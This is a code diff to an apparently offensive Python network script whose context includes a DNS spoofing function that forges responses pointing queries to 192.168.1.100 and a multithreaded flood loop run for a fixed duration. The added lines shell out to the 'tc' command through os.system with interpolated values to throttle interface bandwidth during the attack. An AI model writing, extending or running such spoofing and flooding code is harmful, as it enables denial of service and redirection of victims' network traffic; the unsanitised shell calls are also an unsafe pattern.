@@ -1,3 +1,4 @@
+import os
 import threading
 import time
 import socket
@@ -41,6 +42,12 @@ def dns_spoof(packet):
                            an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata='192.168.1.100')))
         send(spoofed_pkt, verbose=False)
 
+def set_network_speed(interface, speed):
+    # Set the download and upload speed using tc command
+    os.system(f"tc qdisc add dev {interface} root handle 1: htb default 11")
+    os.system(f"tc class add dev {interface} parent 1: classid 1:1 htb rate {speed}mbit")
+    os.system(f"tc class add dev {interface} parent 1:1 classid 1:11 htb rate {speed}mbit")
+
 def flood():
     while True:
         try:
@@ -52,6 +59,10 @@ def flood():
             print(f"Error: {e}")
 
 def main():
+    interface = "eth0"  # Replace with your network interface
+    speed = random.randint(10, 50)  # Random speed between 10 and 50 Mbps
+    set_network_speed(interface, speed)
+
     threads = []
     for _ in range(NUM_THREADS):
         t = threading.Thread(target=flood)
@@ -70,6 +81,9 @@ def main():
     time.sleep(DURATION)
     for t in threads:
         t.do_run = False
+
+    # Remove the traffic control settings
+    os.system(f"tc qdisc del dev {interface} root")
 
 if __name__ == "__main__":
     main()
